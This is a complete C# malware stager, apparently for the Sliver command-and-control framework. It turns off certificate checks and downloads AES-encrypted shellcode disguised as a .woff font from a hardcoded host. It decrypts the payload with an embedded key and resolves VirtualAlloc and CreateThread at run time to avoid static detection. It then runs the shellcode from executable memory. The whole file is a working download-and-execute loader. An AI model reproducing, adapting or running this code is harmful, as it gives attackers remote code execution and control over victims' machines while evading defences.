using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Sliver_stager
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t";
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://192.168.24.128:8443/test.woff";

        // Define delegates for the API functions we'll dynamically resolve
        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length - 1; i++)
            {
                l.Add(shellcode[i]);
            }

            byte[] actual = l.ToArray();

            byte[] decrypted;
            decrypted = Decrypt(actual, AESKey, AESIV);

            // Dynamically load kernel32.dll and resolve function pointers
            IntPtr hKernel32 = LoadLibrary("kernel32.dll");
            if (hKernel32 == IntPtr.Zero)
            {
                Console.WriteLine("Failed to load kernel32.dll.");
                return;
            }

            IntPtr pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
            IntPtr pCreateThread = GetProcAddress(hKernel32, "CreateThread");
            IntPtr pWaitForSingleObject = GetProcAddress(hKernel32, "WaitForSingleObject");

            if (pVirtualAlloc == IntPtr.Zero || pCreateThread == IntPtr.Zero || pWaitForSingleObject == IntPtr.Zero)
            {
                Console.WriteLine("Failed to get function addresses.");
                return;
            }

            // Convert the function pointers to delegates
            VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAllocDelegate));
            CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThreadDelegate));
            WaitForSingleObjectDelegate WaitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(pWaitForSingleObject, typeof(WaitForSingleObjectDelegate));

            // Allocate memory for the decrypted payload
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);  // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            Marshal.Copy(decrypted, 0, addr, decrypted.Length);

            // Create a thread to execute the payload
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF); // Wait indefinitely for the thread to finish
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            DownloadAndExecute();
        }
    }
}
